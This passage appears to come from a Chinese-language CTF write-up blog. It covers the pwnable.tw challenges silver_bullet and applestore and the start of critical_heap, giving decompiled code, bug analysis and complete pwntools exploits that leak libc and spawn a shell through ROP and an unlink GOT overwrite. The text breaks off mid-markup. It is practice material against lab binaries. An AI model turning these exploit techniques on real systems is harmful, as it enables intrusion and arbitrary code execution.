class="line">print(&apos;0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver_bullet"></a>silver_bullet</h1><p><em>风格比较有意思的一个题目</em></p><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>三个选项:<br>1.create_bullet description最大为0x30，<br>2.power_up 若description小于0x30,最多可以增加至0x30，<br>3.beat 用上面的power beat HP为0x7fffffff的werewolf，打败便退出。</p><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl power_up(char *bullet_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+0h] [ebp-34h]</span><br><span class="line">  size_t v3; // [esp+30h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  memset(&amp;s, 0, 0x30u);</span><br><span class="line">  if ( !*bullet_ptr )</span><br><span class="line">    return puts(&quot;You need create the bullet first !&quot;);</span><br><span class="line">  if ( *((_DWORD *)bullet_ptr + 12) &gt; 0x2Fu )</span><br><span class="line">    return puts(&quot;You can&apos;t power up any more !&quot;);</span><br><span class="line">  printf(&quot;Give me your another description of bullet :&quot;);</span><br><span class="line">  read_input(&amp;s, 48 - *((_DWORD *)bullet_ptr + 12));</span><br><span class="line"></span><br><span class="line">  strncat(bullet_ptr, &amp;s, 48 - *((_DWORD *)bullet_ptr + 12));</span><br><span class="line"></span><br><span class="line">  v3 = strlen(&amp;s) + *((_DWORD *)bullet_ptr + 12);</span><br><span class="line">  printf(&quot;Your new power is : %u\n&quot;, v3);</span><br><span class="line">  *((_DWORD *)bullet_ptr + 12) = v3;</span><br><span class="line">  return puts(&quot;Enjoy it !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>乍一看感觉逻辑没什么问题，寻找可能有问题的地方，最后问题在strncat上<br>因为程序的存在一个结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct bullet&#123;</span><br><span class="line">  char bullet_ptr[0x30]</span><br><span class="line">  int length</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而strncat合并字符串时，合并完之后会在后面加上\x00,因为上面结构体的存在，我们就有希望覆盖length，然后再次powerup便可以溢出覆盖返回地址了。</p><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><p>本地测试莫名其妙过不了，但是远程没问题。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#sh = process (&apos;./silver_bullet&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;,10103)</span><br><span class="line">elf = ELF(&apos;./silver_bullet&apos;)</span><br><span class="line">libc = ELF(&apos;libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def create(con):</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;of bullet :&apos;)</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def powerup(con):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;of bullet :&apos;)</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def beat():</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">pop_ebx_ret = 0x8048475</span><br><span class="line"></span><br><span class="line">create(&apos;a&apos;*(0x30-1))</span><br><span class="line">powerup(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;\xff&apos;*3 + &apos;zzzz&apos;</span><br><span class="line">pay += p32(elf.plt[&apos;puts&apos;]) + p32(pop_ebx_ret) + p32(elf.got[&apos;puts&apos;])</span><br><span class="line">pay += p32(elf.symbols[&apos;main&apos;])</span><br><span class="line"></span><br><span class="line">powerup(pay)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;win !!\n&apos;)</span><br><span class="line">puts_addr = u32(sh.recv(4))</span><br><span class="line">system_addr = puts_addr - libc.symbols[&apos;puts&apos;] +  libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = puts_addr - libc.symbols[&apos;puts&apos;] + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line"></span><br><span class="line">success(&quot;system_addr : &quot; + hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr : &quot; + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(&apos;a&apos;*(0x30-1))</span><br><span class="line">powerup(&apos;1&apos;)</span><br><span class="line">pay = &apos;\xff&apos;*3 + &apos;bbbb&apos;</span><br><span class="line">pay += p32(system_addr) + p32(pop_ebx_ret) + p32(binsh_addr)</span><br><span class="line">powerup(pay)</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="applestore"><a href="#applestore" class="headerlink" title="applestore"></a>applestore</h1><p><em>好难啊啊啊啊啊，心累的不行，看大佬的wp回回血</em></p><p>ps: 假如在    libc = ELF(‘./libc_32.so.6’) 时出现这种报错：ValueError: seek out of range ， 多半就是文件没下载完全。。</p><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>主要功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;=== Menu ===&quot;);</span><br><span class="line">  printf(&quot;%d: Apple Store\n&quot;, 1);</span><br><span class="line">  printf(&quot;%d: Add into your shopping cart\n&quot;, 2);</span><br><span class="line">  printf(&quot;%d: Remove from your shopping cart\n&quot;, 3);</span><br><span class="line">  printf(&quot;%d: List your shopping cart\n&quot;, 4);</span><br><span class="line">  printf(&quot;%d: Checkout\n&quot;, 5);</span><br><span class="line">  return printf(&quot;%d: Exit\n&quot;, 6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int handler()</span><br><span class="line">&#123;</span><br><span class="line">  char nptr; // [esp+16h] [ebp-22h]</span><br><span class="line">  unsigned int v2; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;&gt; &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    my_read(&amp;nptr, 0x15u);</span><br><span class="line">    switch ( atoi(&amp;nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        list();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        delete();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        cart();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        checkout();</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        puts(&quot;Thank You for Your Purchase!&quot;);</span><br><span class="line">        return __readgsdword(0x14u) ^ v2;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;It&apos;s not a choice! Idiot.&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()         //添加购物车，采用了my_read函数，但是存在问题，也就是在read时可以输入\x00在中间分隔，以便在不影响后面的基础上，覆盖后面栈上的内容。</span><br><span class="line">&#123;</span><br><span class="line">  char **v1; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  char nptr; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v3; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Device Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);</span><br><span class="line">  switch ( atoi(&amp;nptr) )</span><br><span class="line">  &#123;</span><br><span class="line">    case 1:</span><br><span class="line">      v1 = create((int)&quot;iPhone 6&quot;, (char *)199);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 2:</span><br><span class="line">      v1 = create((int)&quot;iPhone 6 Plus&quot;, (char *)299);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 3:</span><br><span class="line">      v1 = create((int)&quot;iPad Air 2&quot;, (char *)499);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 4:</span><br><span class="line">      v1 = create((int)&quot;iPad Mini 3&quot;, (char *)399);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    case 5:</span><br><span class="line">      v1 = create((int)&quot;iPod Touch&quot;, (char *)199);</span><br><span class="line">      insert((int)v1);</span><br><span class="line">LABEL_8:</span><br><span class="line">      printf(&quot;You&apos;ve put *%s* in your shopping cart.\n&quot;, *v1);</span><br><span class="line">      puts(&quot;Brilliant! That&apos;s an amazing idea.&quot;);</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      puts(&quot;Stop doing that. Idiot!&quot;);</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int cart()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v0; // eax</span><br><span class="line">  signed int v2; // [esp+18h] [ebp-30h]</span><br><span class="line">  int cost; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  _DWORD *i; // [esp+20h] [ebp-28h]</span><br><span class="line">  char buf; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v6; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  v2 = 1;</span><br><span class="line">  cost = 0;</span><br><span class="line">  printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;buf, 0x15u);</span><br><span class="line">  if ( buf == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;==== Cart ====&quot;);  //遍历链表来输出cart</span><br><span class="line">    for ( i = (_DWORD *)mycart; i; i = (_DWORD *)i[2] )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      printf(&quot;%d: %s - $%d\n&quot;, v0, *i, i[1]);   // i[1] == money</span><br><span class="line">                                                </span><br><span class="line">      cost += i[1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return cost;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [esp+10h] [ebp-38h]</span><br><span class="line">  _DWORD *v2; // [esp+14h] [ebp-34h]</span><br><span class="line">  int v3; // [esp+18h] [ebp-30h]</span><br><span class="line">  int FD; // [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  int BK; // [esp+20h] [ebp-28h]</span><br><span class="line">  char nptr; // [esp+26h] [ebp-22h]</span><br><span class="line">  unsigned int v7; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(0x14u);</span><br><span class="line">  v1 = 1;</span><br><span class="line">  v2 = (_DWORD *)mycart;</span><br><span class="line">  printf(&quot;Item Number&gt; &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  my_read(&amp;nptr, 0x15u);</span><br><span class="line">  v3 = atoi(&amp;nptr);</span><br><span class="line">  while ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ( v1 == v3 )                  //典型的unlink</span><br><span class="line">    &#123;</span><br><span class="line">      FD = v2[2];</span><br><span class="line">      BK = v2[3];</span><br><span class="line">      if ( BK )</span><br><span class="line">        *(_DWORD *)(BK + 8) = FD;</span><br><span class="line">      if ( FD )</span><br><span class="line">        *(_DWORD *)(FD + 12) = BK;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      printf(&quot;Remove %d:%s from your shopping cart.\n&quot;, v1, *v2);</span><br><span class="line">      return __readgsdword(0x14u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">    v2 = (_DWORD *)v2[2];</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int checkout()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+10h] [ebp-28h]</span><br><span class="line">  char *v2; // [esp+18h] [ebp-20h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  unsigned int v4; // [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(0x14u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  if ( v1 == 7174 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;*: iPhone 8 - $1&quot;);</span><br><span class="line">    asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;);</span><br><span class="line">    v3 = 1;</span><br><span class="line">    insert((int)&amp;v2);</span><br><span class="line">    v1 = 7175;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Total: $%d\n&quot;, v1);</span><br><span class="line">  puts(&quot;Want to checkout? Maybe next time!&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>在不断的使用添加购物车的函数add后，其形成了一个链表，而在输出时是通过遍历链表来依次输出的。<br>结构str大概如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str[0]: cost</span><br><span class="line">str[1]: name---&gt; 实际为指针</span><br><span class="line">str[2]: FD</span><br><span class="line">str[3]: BK</span><br></pre></td></tr></table></figure><p>而我们在输入时使用的my_read函数（cart/delete函数均调用）因为可以覆盖后面的栈，所以会有希望去修改链表的节点为got表之类的。然后cart函数来泄露libc基址等等。</p><p>同时，在delete函数中使用了unlink的过程，也有利用的希望。RELRO不是full说明GOT表还是可以修改的，所以可以用unlink来修改got表.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec applestore</span><br><span class="line">[*] &apos;/root/pwnable/applestore/applestore&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>不过漏洞利用的切入点其实在后面，在checkout函数里，当购物车金额达到7174，就会赠送一个iphone8…而偏偏赠送的这个iphone8被放在了栈里面。而其实这几个函数用的都是同一栈帧（栈顶或许有差异，但是栈底是一致的），而恰好存储iphone8的位置在其他函数中可以被修改。也就是链表的结尾分配到了我们可以修改的栈上。</p><p>除此以外，需要栈地址的泄露，可以：</p><ol><li>利用前面的leak洞,从第一个chunk开始,不断leak chunk的fd,直到stack上的chunk的前一个的chunk的fd,即可得到stack</li><li>我们可以用environ变量加上libc的基址来得到栈地址。</li></ol><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./applestore&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10104)</span><br><span class="line">bin = ELF(&apos;./applestore&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def buy(idx):</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;Device Number&gt; &apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Item Number&gt; &apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def dele2(con):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Item Number&gt; &apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def show(con):</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">sh.recvuntil(&apos;(y/n) &gt; &apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def checkout():</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.recvuntil(&apos;(y/n) &gt; &apos;)</span><br><span class="line">sh.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">buy(2)</span><br><span class="line">for i in range(6):</span><br><span class="line">buy(1)</span><br><span class="line"></span><br><span class="line">checkout()</span><br><span class="line">pay = &apos;y\x00&apos;</span><br><span class="line">pay+=p32(bin.got[&apos;puts&apos;]) + 3*p32(0)</span><br><span class="line">show(pay)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;27: &apos;)</span><br><span class="line">libc.address = u32(sh.recv(4))-libc.symbols[&apos;puts&apos;]</span><br><span class="line">envp = libc.symbols[&apos;environ&apos;]</span><br><span class="line">system = libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&apos;libc_base: &apos;+hex(libc.address))</span><br><span class="line">success(&apos;envp: &apos;+hex(envp))</span><br><span class="line"></span><br><span class="line">pay = &apos;y\x00&apos;</span><br><span class="line">pay+=p32(envp)+p32(1)+p32(0)+p32(0)</span><br><span class="line">show(pay)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;27: &apos;)</span><br><span class="line">stack_envp = u32(sh.recv(4))</span><br><span class="line">success(&apos;stack_envp: &apos;+hex(stack_envp))    //通过environ泄露栈地址</span><br><span class="line"></span><br><span class="line">//仍未理解的过程：交换GOT和ebp,从而子函数ret后回到main,ebp会到GOT上,在main中read,会读到GOT表上,可以改写atoi到system.</span><br><span class="line"></span><br><span class="line">ebp = stack_envp-0x104</span><br><span class="line">atoi_got = bin.got[&apos;atoi&apos;]</span><br><span class="line">pay = &apos;27&apos;</span><br><span class="line">pay += p32(envp)+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)</span><br><span class="line">dele2(pay)</span><br><span class="line"></span><br><span class="line">pay = &apos;$0\x00\x00&apos;+p32(system)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="critical-heap"><a href="#critical-heap" class="headerlink" title="critical_heap"></a>critical_heap</h1><p><em>难到仅有的wp基本上完全看不懂。。。</em></p><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>题目比较长，功能比较丰富。。</p><p>分析出来的结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">struct clock&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0xDEADBEEF;</span><br><span class="line">  char[4] year;</span><br><span class="line">  char[4] month;</span><br><span class="line">  char[4] day;</span><br><span class="line">  char[4] hour;</span><br><span class="line">  char[4] minute;</span><br><span class="line">  char[4] second;</span><br><span class="line"></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">struct system&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0x48694869;</span><br><span class="line">  string PathOfSystem;</span><br><span class="line">  string DetailOfSystem;</span><br><span class="line">  char[4] UserOfSystem;</span><br><span class="line">  char[4] NameOfSystem;</span><br><span class="line">  char[4] rand;</span><br><span class="line"></span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line">struct normal&#123;</span><br><span class="line">  int *name;</span><br><span class="line">  int inuse;</span><br><span class="line">  0x13371337;</span><br><span class="line">  char[40] content;</span><br><span class="line">  int sig;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>完全没有见过的漏洞。。。相较于文件漏洞，倒更像是函数源码漏洞与小小的文件漏洞相配合产生的大问题。。。</p><ol><li>localtime和setenv配合能将任意文件内容写到heap上.  </li><li>chunk_system的detail在offset 0x20,chunk_normal的content在offset 0x18的位置,content读取的时候没有截断,而detail是存在栈上的,因此可以leak heap. （比较容易想到的漏洞,文件漏洞）.</li><li>在normal_heap的play下,有一个printf_chk的fmt洞,配合normal_heap的play下的change content就能在栈上留下信息,然后任意地址读(因为有chk,所以应该是无法用%n来任意地址写的).</li></ol><p>第一步需要看localtime的源码：以libc2.23源码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 